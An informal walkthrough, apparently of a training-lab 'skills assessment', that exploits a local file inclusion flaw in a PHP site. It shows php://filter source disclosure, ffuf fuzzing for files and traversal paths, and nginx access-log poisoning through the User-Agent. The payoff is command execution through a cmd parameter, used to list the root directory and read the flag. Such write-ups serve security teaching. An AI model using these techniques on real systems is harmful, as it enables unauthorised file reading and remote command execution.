# SKILLS ASSESSEMENT

first i browse the file : i find interssting parametres : page

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*ZVxfRaeOUKkCB_rx0ozygQ.png" alt="" height="394" width="700"><figcaption></figcaption></figure>

then i try to use wrappers to read the source code of caontact.

```
php://filter/read=convert.base64-encode/resource=contact
```

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*5zEvzzT3_ljKbCZafb3r5Q.png" alt="" height="370" width="700"><figcaption></figcaption></figure>

it works

and also when i try with ../../ payload i find this “Invalid input detected!” it take my attention that there is a detection

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*XMjN_iFT1IL30ntuFrGkWg.png" alt="" height="366" width="700"><figcaption></figcaption></figure>

then i tried all the wrappers no one work for me ,

then i had idea to fuzz .php file

{% code overflow="wrap" fullWidth="true" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.63.109:30888/FUZZ.php -ic
```
{% endcode %}

i got these files

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*fc1WvjyM5fbGn7x6dT6yDg.png" alt="" height="369" width="700"><figcaption></figcaption></figure>

then i read the index

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*nUFeJR5QHWqz4nh9_6UfNA.png" alt="" height="372" width="700"><figcaption></figcaption></figure>

the i decode the base 64

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*gPJRauBp3fXQxtjlwJO8vQ.png" alt="" height="316" width="700"><figcaption></figcaption></figure>

i got this path ilf\_admin/index.php

then i tried to read the default configuration file :

first we need to know ../../../../../../../ how much ../ i use , i try it manualy first ../etc/passwd to ../../../../../../../etc/passwd

{% code overflow="wrap" fullWidth="true" %}
```
ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-WordList-Linux.txt:FUZZ -u 'http://94.237.63.109:30888/ilf_admin/index.php?log=../../../../../../../FUZZ' -fs 2046
```
{% endcode %}

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*KyKG6GxGEMa-8JVKMu_gDA.png" alt="" height="437" width="700"><figcaption></figcaption></figure>

i found this ../../../../../../..//var/log/nginx/access.log

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*hHEHa91lobMR-ZvnejzG4A.png" alt="" height="468" width="700"><figcaption></figcaption></figure>

i see that the User-agent is written in this file , for this i try to poisson it

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*nvavTmJ95WGQhNQpPj6kuw.png" alt="" height="374" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*B5FCppReEvR9nL912G00HA.png" alt="" height="452" width="700"><figcaption></figcaption></figure>

when i tried

{% code overflow="wrap" fullWidth="true" %}
```
http://94.237.63.109:53703/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=ls+/
```
{% endcode %}

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*bsdxyTedhfeiYF6x8_zguQ.png" alt="" height="518" width="700"><figcaption></figcaption></figure>

then i read the file to get the flag

{% code overflow="wrap" fullWidth="true" %}
```
http://94.237.63.109:53703/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=cat+/flag_dacc60f2348d.txt
```
{% endcode %}

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*ARJRS6gU0CPwEqomQ9j4Vg.png" alt="" height="381" width="700"><figcaption></figcaption></figure>

finnaly i got the flag
